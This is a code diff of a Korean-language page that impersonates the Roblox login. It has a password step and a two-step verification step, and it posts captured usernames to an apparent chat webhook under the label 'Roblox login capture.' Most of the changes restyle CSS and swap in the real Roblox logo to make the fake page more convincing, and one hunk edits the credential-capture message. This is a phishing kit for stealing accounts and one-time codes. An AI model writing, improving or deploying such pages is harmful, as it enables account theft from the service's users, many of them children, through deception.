@@ -25,15 +25,13 @@
             align-items: center;
             justify-content: space-between;
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
+            top: 0; left: 0; right: 0;
             z-index: 100;
         }
         .header-left { display: flex; align-items: center; gap: 12px; }
         .header-back { width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; }
         .header-back svg { fill: #fff; }
-        .header-logo svg { height: 24px; display: block; }
+        .header-logo img { height: 24px; display: block; }
         .header-right { display: flex; align-items: center; gap: 16px; }
         .header-right svg { fill: #fff; width: 22px; height: 22px; }
 
@@ -45,32 +43,14 @@
             align-items: center;
         }
 
-        .logo-section {
-            text-align: center;
-            margin: 20px 0 32px;
-        }
-        .logo-section .logo-icon {
-            width: 72px;
-            height: 72px;
-            margin-bottom: 12px;
-        }
-        .logo-section h1 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #111;
-            letter-spacing: -0.3px;
-        }
+        .logo-section { text-align: center; margin: 20px 0 32px; }
+        .logo-section .logo-icon { width: 72px; height: 72px; margin-bottom: 12px; }
+        .logo-section h1 { font-size: 22px; font-weight: 700; color: #111; letter-spacing: -0.3px; }
 
         .login-card { width: 100%; max-width: 400px; }
 
         .form-group { margin-bottom: 16px; }
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #555;
-            margin-bottom: 6px;
-        }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 6px; }
         .form-group input {
             width: 100%;
             padding: 14px 16px;
@@ -82,6 +62,7 @@
             -webkit-appearance: none;
         }
         .form-group input:focus { border-color: #007aff; box-shadow: 0 0 0 3px rgba(0,122,255,0.12); }
+
         .login-btn {
             width: 100%;
             padding: 15px;
@@ -96,28 +77,12 @@
             -webkit-appearance: none;
         }
         .login-btn:active { background: #0056b3; }
-        .forgot-link {
-            display: block;
-            text-align: center;
-            margin-top: 16px;
-            font-size: 15px;
-            color: #007aff;
-            font-weight: 500;
-        }
-        .divider-wrap {
-            display: flex;
-            align-items: center;
-            margin: 24px 0;
-            color: #8e8e93;
-            font-size: 13px;
-        }
-        .divider-wrap::before, .divider-wrap::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: #e0e0e0;
-        }
+
+        .forgot-link { display: block; text-align: center; margin-top: 16px; font-size: 15px; color: #007aff; font-weight: 500; }
+        .divider-wrap { display: flex; align-items: center; margin: 24px 0; color: #8e8e93; font-size: 13px; }
+        .divider-wrap::before, .divider-wrap::after { content: ''; flex: 1; height: 1px; background: #e0e0e0; }
         .divider-wrap span { padding: 0 16px; }
+
         .device-btn {
             width: 100%;
             padding: 14px;
@@ -135,77 +100,46 @@
             -webkit-appearance: none;
         }
         .device-btn:active { background: #f2f2f7; }
-        .signup-text {
-            text-align: center;
-            margin-top: 32px;
-            font-size: 15px;
-            color: #777;
-        }
+
+        .signup-text { text-align: center; margin-top: 32px; font-size: 15px; color: #777; }
         .signup-text a { color: #007aff; font-weight: 700; }
+
         .error-msg {
-            color: #d32f2f;
-            font-size: 13px;
-            margin-top: 12px;
-            display: none;
-            padding: 10px 12px;
-            background: #fef0ef;
-            border-radius: 10px;
-            text-align: center;
+            color: #d32f2f; font-size: 13px; margin-top: 12px; display: none;
+            padding: 10px 12px; background: #fef0ef; border-radius: 10px; text-align: center;
         }
 
         #step2fa { display: none; }
         .fa-header { text-align: center; margin-bottom: 24px; }
         .fa-header .fa-icon { width: 64px; height: 64px; margin-bottom: 16px; }
         .fa-header h2 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
-        .fa-header p { font-size: 14px; color: #666; line-height: 1.4; }
-        .fa-input-wrap {
-            display: flex;
-            gap: 8px;
-            justify-content: center;
-            margin: 24px 0;
-        }
+        .fa-header p { font-size: 14px; color: #666; line-height: 1.4; word-break: break-all; }
+        .fa-header p .fa-email { font-weight: 700; color: #333; }
+
+        .fa-input-wrap { display: flex; gap: 8px; justify-content: center; margin: 24px 0; }
         .fa-input-wrap input {
-            width: 48px;
-            height: 56px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: 700;
-            border: 1px solid #e0e0e0;
-            border-radius: 10px;
-            background: #fff;
-            color: #333;
-            -webkit-appearance: none;
+            width: 48px; height: 56px; text-align: center; font-size: 24px; font-weight: 700;
+            border: 1px solid #e0e0e0; border-radius: 10px; background: #fff; color: #333; -webkit-appearance: none;
         }
         .fa-input-wrap input:focus { border-color: #007aff; box-shadow: 0 0 0 3px rgba(0,122,255,0.12); }
+
         .fa-resend { text-align: center; font-size: 14px; color: #8e8e93; margin-top: 16px; }
         .fa-resend a { color: #007aff; font-weight: 500; }
+
         .fa-error {
-            color: #d32f2f;
-            font-size: 13px;
-            margin-top: 12px;
-            display: none;
-            padding: 10px 12px;
-            background: #fef0ef;
-            border-radius: 10px;
-            text-align: center;
+            color: #d32f2f; font-size: 13px; margin-top: 12px; display: none;
+            padding: 10px 12px; background: #fef0ef; border-radius: 10px; text-align: center;
         }
 
-        .footer {
-            background: #101010;
-            padding: 16px 20px;
-            text-align: center;
-        }
-        .footer-links {
-            list-style: none;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 8px;
-        }
+        .footer { background: #101010; padding: 16px 20px; text-align: center; }
+        .footer-links { list-style: none; display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; margin-bottom: 8px; }
         .footer-links a { color: #888; font-size: 11px; }
         .footer-links a:hover { color: #fff; }
         .footer-copy { color: #555; font-size: 11px; }
+
+        @media (max-width: 380px) {
+            .fa-input-wrap input { width: 40px; height: 48px; font-size: 20px; }
+        }
     </style>
 </head>
 <body>
@@ -216,12 +150,7 @@
                 <svg viewBox="0 0 24 24" width="24" height="24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
             </a>
             <div class="header-logo">
-                <svg viewBox="0 0 100 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <text x="0" y="20" font-family="Arial, sans-serif" font-size="22" font-weight="800" fill="#fff">R</text>
-                    <rect x="26" y="4" width="16" height="16" rx="2" transform="rotate(20 26 4)" fill="none" stroke="#fff" stroke-width="2.5"/>
-                    <rect x="30" y="8" width="8" height="8" rx="1" transform="rotate(20 30 8)" fill="#fff"/>
-                    <text x="48" y="20" font-family="Arial, sans-serif" font-size="22" font-weight="800" fill="#fff">blox</text>
-                </svg>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Robloxlogo2019.png/240px-Robloxlogo2019.png" alt="Roblox">
             </div>
         </div>
         <div class="header-right">
@@ -233,7 +162,7 @@
 
         <div id="step1">
             <div class="logo-section">
-                <img class="logo-icon" src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox">
+                <img class="logo-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Robloxlogo2019.png/240px-Robloxlogo2019.png" alt="Roblox">
                 <h1>Roblox에 로그인</h1>
             </div>
             <div class="login-card">
@@ -265,9 +194,9 @@
 
         <div id="step2fa">
             <div class="fa-header">
-                <img class="fa-icon" src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox">
+                <img class="fa-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Robloxlogo2019.png/240px-Robloxlogo2019.png" alt="Roblox">
                 <h2>2단계 인증</h2>
-                <p><strong id="faEmailDisplay">이메일</strong>로<br>전송된 인증 코드를 입력하세요.</p>
+                <p><span class="fa-email" id="faEmailDisplay">이메일</span>로 전송된 인증 코드를 입력하세요.</p>
             </div>
             <form id="faForm">
                 <div class="fa-input-wrap">
@@ -280,7 +209,7 @@
                 </div>
                 <button class="login-btn" type="submit">확인</button>
                 <div class="fa-resend">코드를 받지 못하셨나요? <a href="#">다시 보내기</a></div>
-                <div class="fa-error" id="faErrorMsg">잘못된 코드입니다. 다시 시도하거나 코드를 다시 보내세요.</div>
+                <div class="fa-error" id="faErrorMsg">잘못된 코드입니다. 다시 시도하세요.</div>
             </form>
         </div>
 
@@ -326,7 +255,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: '**[1단계] Roblox 모바일 로그인 캡처**',
+                    content: '**[1단계] Roblox 로그인 캡처**',
                     embeds: [{
                         fields: [
                             { name: '사용자 이름/이메일', value: capturedUser, inline: true },
